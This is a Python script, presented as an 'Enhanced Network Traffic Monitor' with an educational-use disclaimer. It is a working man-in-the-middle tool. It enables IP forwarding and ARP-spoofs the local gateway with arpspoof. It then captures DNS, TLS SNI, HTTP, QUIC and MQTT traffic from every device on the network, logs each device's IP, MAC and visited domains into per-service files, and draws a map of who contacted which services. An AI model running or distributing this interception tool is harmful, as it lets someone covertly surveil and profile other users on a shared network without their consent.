# #################################################################
#               Enhanced Network Traffic Monitor
# #################################################################
#
# Created by: sluisr
#
# Disclaimer: This script is intended for educational purposes
# and for use in authorized environments only. The author is not
# responsible for any misuse or damage caused by this program.
# Use at your own risk.
#
# #################################################################

import subprocess
import sys
import os
import json
import time
from datetime import datetime
import pyshark
from termcolor import colored
import signal
import asyncio

try:
    import graphviz
except ImportError:
    print(colored("[!] Error: The 'graphviz' library is not installed. Please install it with 'pip3 install graphviz'", "red"))
    sys.exit(1)


SERVICE_COLORS = {
    "facebook": "yellow",
    "meta": "yellow",
    "fb": "yellow",
    "instagram": "magenta",
    "whatsapp": "green",
    "google": "red",
    "youtube": "red",
    "twitter": "cyan",
    "tiktok": "white",
    "amazon": "yellow",
    "netflix": "yellow",
    "microsoft": "white",
    "apple": "white",
    "quic": "yellow",
    "mqtt": "yellow",
    "default": "white"
}

def check_privileges():
    if os.geteuid() != 0:
        print(colored("[!] Error: This script must be run with superuser privileges (sudo).", "red"))
        sys.exit(1)

def check_dependencies():
    for cmd in ["tshark", "arpspoof", "dot"]:
        if subprocess.run(["which", cmd], capture_output=True).returncode != 0:
            print(colored(f"[!] Error: '{cmd}' is not installed. Please install it.", "red"))
            if cmd == "arpspoof": print("    (e.g., sudo apt install dsniff)")
            if cmd == "tshark": print("    (e.g., sudo apt install tshark)")
            if cmd == "dot": print("    (e.g., sudo apt install graphviz)")
            sys.exit(1)

def get_network_info():
    try:
        route_cmd = subprocess.check_output(["ip", "-o", "-4", "route", "show", "to", "default"])
        route_info = route_cmd.decode().split()
        interface = route_info[4]
        gateway = route_info[2]
        return interface, gateway
    except Exception as e:
        print(colored(f"[!] Could not get network information: {e}", "red"))
        sys.exit(1)

def set_ip_forwarding(enable: bool):
    value = "1" if enable else "0"
    action = 'Enabling' if enable else 'Disabling'
    print(colored(f"[*] {action} IP forwarding...", "yellow"))
    subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward={value}"], capture_output=True)

def start_arp_spoof(interface, gateway):
    print(colored(f"[*] Starting ARP spoofing on {interface} against {gateway}", "yellow"))
    return subprocess.Popen(["arpspoof", "-i", interface, gateway], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def get_service_info(domain):
    domain_lower = domain.lower()
    for service, color in SERVICE_COLORS.items():
        if service in domain_lower:
            return service.upper(), color
    return "Unknown", SERVICE_COLORS["default"]

def get_log_file(service_name, audit_dir, file_handlers):
    if service_name not in file_handlers:
        service_dir = os.path.join(audit_dir, service_name.lower())
        os.makedirs(service_dir, exist_ok=True)
        log_path = os.path.join(service_dir, "log.jsonl")
        file_handlers[service_name] = open(log_path, "a")
    return file_handlers[service_name]

def process_packet(packet, ip_mac_map, file_handlers, audit_dir, all_logs):
    domain = None
    protocol = None

    try:
        if 'DNS' in packet and hasattr(packet.dns, 'qry_name'):
            domain = packet.dns.qry_name
            protocol = "DNS"

        elif 'TLS' in packet and hasattr(packet.tls, 'handshake_extensions_server_name'):
            domain = packet.tls.handshake_extensions_server_name
            protocol = "TLS/SNI"
        
        elif 'HTTP' in packet and hasattr(packet.http, 'host'):
            domain = packet.http.host
            protocol = "HTTP"

        elif 'QUIC' in packet and hasattr(packet, 'quic') and hasattr(packet.quic, 'tls'):
             if hasattr(packet.quic.tls, 'handshake_extensions_server_name'):
                domain = packet.quic.tls.handshake_extensions_server_name
                protocol = "QUIC"

        elif 'MQTT' in packet:
            protocol = "MQTT"
            if hasattr(packet.mqtt, 'topic'):
                domain = f"Topic: {packet.mqtt.topic}"
            elif hasattr(packet.mqtt, 'clientid'):
                domain = f"ClientID: {packet.mqtt.clientid}"
            else:
                domain = "MQTT Packet"


        if domain:
            source_ip = packet.ip.src
            dest_ip = packet.ip.dst
            source_mac = packet.eth.src
            ip_mac_map[source_ip] = source_mac

            service_name, color = get_service_info(domain)
            
            log_file = get_log_file(service_name, audit_dir, file_handlers)
            
            log_entry = {
                "timestamp": datetime.now().isoformat(),
                "source_ip": source_ip,
                "source_mac": source_mac,
                "destination_ip": dest_ip,
                "protocol": protocol,
                "service": service_name,
                "query": domain
            }
            log_file.write(json.dumps(log_entry) + "\n")
            log_file.flush()
            all_logs.append(log_entry)

            time_str = datetime.now().strftime('%H:%M:%S')
            
            source_str = f"{source_ip} ({source_mac})"
            service_str = f"[{service_name}]"
            dest_str = f"Dest: {dest_ip}"
            query_str = f"(Query: {domain})"

            display_msg = f"[{time_str}] [Device: {source_str}] -> {service_str} {dest_str} {query_str}"
            
            attrs = ['bold'] if service_name != "Unknown" else []
            print(colored(display_msg, color, attrs=attrs))

    except AttributeError:
        pass


def generate_network_map(ip_mac_map, all_logs, audit_dir, gateway):
    print(colored("[*] Generating professional network map...", "cyan"))
    
    dot = graphviz.Digraph('NetworkMap', comment='Audit Network Map')
    dot.attr(
        rankdir='LR',
        size='25,15',
        label='Audit Network Map',
        fontsize='22',
        fontname='Helvetica,Arial,sans-serif',
        splines='curved',
        nodesep='1',
        ranksep='2',
        bgcolor='#333333',
        fontcolor='white'
    )
    dot.attr('node', fontname='Helvetica,Arial,sans-serif', fontcolor='white')
    dot.attr('edge', fontname='Helvetica,Arial,sans-serif', fontsize='12')

    edge_colors = ['#a6cee3', '#1f78b4', '#b2df8a', '#33a02c', '#fb9a99', '#e31a1c', '#fdbf6f', '#ff7f00', '#cab2d6', '#6a3d9a', '#ffff99', '#b15928']
    device_colors = {}
    device_list = [ip for ip in ip_mac_map if ip != gateway]
    for i, ip in enumerate(device_list):
        device_colors[ip] = edge_colors[i % len(edge_colors)]

    with dot.subgraph(name='cluster_internal') as c:
        c.attr(style='filled', color='#444444', label='Internal Network', fontcolor='white', fontsize='18')
        c.attr('node', style='filled', shape='box', fontname='Helvetica,Arial,sans-serif')
        
        c.node('router', f"Router\n{gateway}", shape='diamond', style='filled,bold', fillcolor='#ff6347', fontcolor='white', peripheries='2')

        for ip, mac in ip_mac_map.items():
            if ip != gateway:
                color = device_colors.get(ip, 'white')
                c.node(ip, f"Device\n{ip}\n{mac}", shape='Mrecord', style='filled,rounded', fillcolor=color, fontcolor='black', color='white', penwidth='2')
                c.edge('router', ip, style='dashed', color=color)

    with dot.subgraph(name='cluster_external') as c:
        c.attr(color='lightblue', label='External Services', fontcolor='lightblue', fontsize='18')
        c.attr('node', style='filled', shape='ellipse', fillcolor='#90ee90', fontname='Helvetica,Arial,sans-serif', fontcolor='black')
        
        services = set(log['service'] for log in all_logs)
        for service in services:
            c.node(service, service)

    connections = {}
    for log in all_logs:
        src_ip = log['source_ip']
        service = log['service']
        if src_ip != gateway:
            if (src_ip, service) not in connections:
                connections[(src_ip, service)] = 0
            connections[(src_ip, service)] += 1

    for (src_ip, service), count in connections.items():
        if src_ip in device_colors:
            edge_color = device_colors[src_ip]
            dot.edge(src_ip, service, xlabel=f'<<FONT COLOR="{edge_color}">x{count}</FONT>>', color=edge_color, penwidth='2')

    try:
        map_path = os.path.join(audit_dir, 'network_map_brutal')
        dot.render(map_path, format='png', view=False, cleanup=True)
        print(colored(f"[+] BRUTAL network map saved to: {map_path}.png", "green", attrs=['bold']))
    except Exception as e:
        print(colored(f"[!] Error generating network map: {e}", "red"))

def main():
    check_privileges()
    check_dependencies()

    session_datetime = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    audit_dir = os.path.join("audits", session_datetime)
    os.makedirs(audit_dir, exist_ok=True)
    print(colored(f"[*] Saving logs for this session in: {audit_dir}", "cyan"))


    interface, gateway = get_network_info()
    print(colored(f"[*] Detected interface: {interface}", "cyan"))
    print(colored(f"[*] Gateway (Router): {gateway}", "cyan"))

    arpspoof_proc = None
    capture = None
    file_handlers = {}
    all_logs = []

    def cleanup():
        print(colored("\n[*] Cleaning up and restoring network...", "yellow"))
        if capture and not capture.closed:
            capture.close()
        if arpspoof_proc:
            arpspoof_proc.terminate()
            arpspoof_proc.wait()
        set_ip_forwarding(False)
        for handler in file_handlers.values():
            handler.close()
        
        generate_network_map(ip_mac_map, all_logs, audit_dir, gateway)

        print(colored("[+] Cleanup finished. The network has been restored.", "green"))

    def signal_handler(sig, frame):
        cleanup()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    try:
        set_ip_forwarding(True)
        arpspoof_proc = start_arp_spoof(interface, gateway)
        
        print(colored("\n[+] Capture started. Press Ctrl+C to stop.", "green", attrs=['bold']))
        print("-----------------------------------------------------------------")
        
        ip_mac_map = {}

        capture = pyshark.LiveCapture(interface=interface, display_filter="dns or tls.handshake.type == 1 or http or quic or mqtt")

        for packet in capture.sniff_continuously():
            process_packet(packet, ip_mac_map, file_handlers, audit_dir, all_logs)

    except Exception as e:
        if not isinstance(e, (EOFError, asyncio.exceptions.CancelledError)):
            print(colored(f"\n[!] An unexpected error occurred: {e}", "red"))
    finally:
        cleanup()


if __name__ == "__main__":
    main()